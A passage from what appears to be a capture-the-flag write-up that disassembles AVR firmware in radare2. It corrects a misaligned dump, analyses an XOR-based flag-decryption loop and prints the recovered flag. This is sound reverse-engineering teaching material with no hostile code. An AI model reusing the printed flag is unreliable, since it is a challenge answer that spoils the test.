       ┌└─> 0x00000004      becf           rjmp 0xffffff82             ;[2]
       │    0x00000006      efd8           rcall 0xfffff1e6            ;[3]
       │    0x00000008      e0de           rcall 0xfffffdca            ;[4]
       │┌─< 0x0000000a      bfcd           rjmp 0xfffffb8a             ;[5]
      ┌───< 0x0000000c      bf12           cpse r11, r31               ;[6]
      │││   0x0000000e      e0a0           ldd r14, z+32
      └───> 0x00000010      e0b1           in r30, 0x00               ; IO TWBR: I2C (Two-wire) Serial Interface Bit R
       ││   0x00000012      e0ea           ldi r30, 0xa0
      ┌───< 0x00000014      e9f1           breq 0x90                   ;[7]
      │││   0x00000016      e302           muls r30, r19
      │││   0x00000018      c005           cpc r28, r0
      │││   0x0000001a      900d           add r25, r0
      │││   0x0000001c      92a6           std z+42, r9
      │││   0x0000001e      3bb1           in r19, 0x0b               ; IO UCSRA: USART Control and Status Register A.
      │││   0x00000020      07d9           rcall 0xfffff230            ;[8]
      │││   0x00000022      f727           eor r31, r23
      │││   0x00000024      e0a6           std z+40, r14
      │││   0x00000026      ebb2           in r14, 0x1b               ; IO PORTA: Output pins/pullups address for port
      │││   0x00000028      e001           movw r28, r0
      │││   0x0000002a      c01d           adc r28, r0
      │││   0x0000002c      92a5           ldd r25, z+42
```

Let's try to remove the first byte using r2 command `r-1` at offset 0:

```
            0x00000000      1124           clr r1
            0x00000002      1fbe           out 0x3f, r1                ; '?'; IO SREG: flags
            0x00000004      cfef           ser r28
            0x00000006      d8e0           ldi r29, 0x08
            0x00000008      debf           out 0x3e, r29               ; '>'; IO SPH: Stack higher bits SP8-SP10
            0x0000000a      cdbf           out 0x3d, r28               ; '='; IO SPL: Stack lower bits SP0-SP7
            0x0000000c      12e0           ldi r17, 0x02
            0x0000000e      a0e0           ldi r26, 0x00
            0x00000010      b1e0           ldi r27, 0x01
            0x00000012      eae9           ldi r30, 0x9a
            0x00000014      f1e3           ldi r31, 0x31
        ┌─< 0x00000016      02c0           rjmp 0x1c                   ;[1]
       ┌──> 0x00000018      0590           lpm r0, z+
       |│   0x0000001a      0d92           st x+, r0
       |└─> 0x0000001c      a63b           cpi r26, 0xb6
       |    0x0000001e      b107           cpc r27, r17
       └──< 0x00000020      d9f7           brne 0x18                   ;[2]
            0x00000022      27e0           ldi r18, 0x07
            0x00000024      a6eb           ldi r26, 0xb6
            0x00000026      b2e0           ldi r27, 0x02
        ┌─< 0x00000028      01c0           rjmp 0x2c                   ;[3]
       ┌──> 0x0000002a      1d92           st x+, r1
       |└─> 0x0000002c      a532           cpi r26, 0x25
```
...and suddenly everything fall into its place.

#### Decrypting the flag

Analysing (reading) the dumped firmware and searching for differences with FridgeJIT, the flag decryption function pops out, here's the critical part:

```
; y+1 is a counter, it starts at 0, and here
; gets added in the funny way to the address 0x37f
│      ┌──> 0x00002a60      8981           ldd r24, y+1
│      |│   0x00002a62      882f           mov r24, r24
│      |│   0x00002a64      90e0           ldi r25, 0x00
│      |│   0x00002a66      8158           subi r24, 0x81
│      |│   0x00002a68      9c4f           sbci r25, 0xfc
│      |│   0x00002a6a      9b83           std y+3, r25
│      |│   0x00002a6c      8a83           std y+2, r24
│      |│   0x00002a6e      8a81           ldd r24, y+2
│      |│   0x00002a70      9b81           ldd r25, y+3

; a byte is loaded at that address (0x37f+counter) from
; the program memory
│      |│   0x00002a72      fc01           movw r30, r24
│      |│   0x00002a74      8491           lpm r24, z
│      |│   0x00002a76      8c83           std y+4, r24
│      |│   0x00002a78      8c81           ldd r24, y+4
│      |│   0x00002a7a      8d83           std y+5, r24
│      |│   0x00002a7c      8981           ldd r24, y+1
│      |│   0x00002a7e      882f           mov r24, r24

; load a byte from (0x2d1+counter) from the data memory 
; and XOR it with the above value
│      |│   0x00002a80      90e0           ldi r25, 0x00
│      |│   0x00002a82      8f52           subi r24, 0x2f
│      |│   0x00002a84      9d4f           sbci r25, 0xfd
│      |│   0x00002a86      fc01           movw r30, r24
│      |│   0x00002a88      8081           ld r24, z
│      |│   0x00002a8a      9d81           ldd r25, y+5
│      |│   0x00002a8c      8927           eor r24, r25
│      |│   0x00002a8e      8d83           std y+5, r24

; load a byte from 0x2c0 and OR its negated value
; to the above result (but let's ignore it since in the
; memory dump this is clearly 0)
│      |│   0x00002a90      8091c002       lds r24, 0x2c0
│      |│   0x00002a94      982f           mov r25, r24
│      |│   0x00002a96      9095           com r25
│      |│   0x00002a98      8d81           ldd r24, y+5
│      |│   0x00002a9a      892b           or r24, r25
│      |│   0x00002a9c      2e81           ldd r18, y+6
│      |│   0x00002a9e      3f81           ldd r19, y+7
│      |│   0x00002aa0      f901           movw r30, r18

; call a function on this value. The function to call
; is passed as a parameter to this function
│      |│   0x00002aa2      0995           icall
│      |│   0x00002aa4      8981           ldd r24, y+1
│      |│   0x00002aa6      8f5f           subi r24, 0xff
│      |│   0x00002aa8      8983           std y+1, r24
│      ↑│      ; JMP XREF from 0x00002a5e (fcn.decrypt_flag)
│      |└─> 0x00002aaa      8981           ldd r24, y+1

; this loop repeats for 0x1f times
│      |    0x00002aac      8032           cpi r24, 0x20
│      └──< 0x00002aae      c0f2           brcs 0x2a60
```

It turns out everything we need to know is here. Let's dump 31 bytes from program memory at address `0x37f`:

```
:> p8 31@0x37f
a91e58f227bb1459a363440f2c261eeec2aa40db514ca82e18ac7102d5b9ce
```

And now, in the data memory dump, let's XOR this with whatever is at offset `0x2d1`:

```
:> e io.cache=true
:> wox a91e58f227bb1459a363440f2c261eeec2aa40db514ca82e18ac7102d5b9ce @ 0x2d1!31
:> psz @ 0x2d1
db167b9b73a7bb616741c30f5805d11P
```

Aaaand... that's the flag (without the `P`).


   
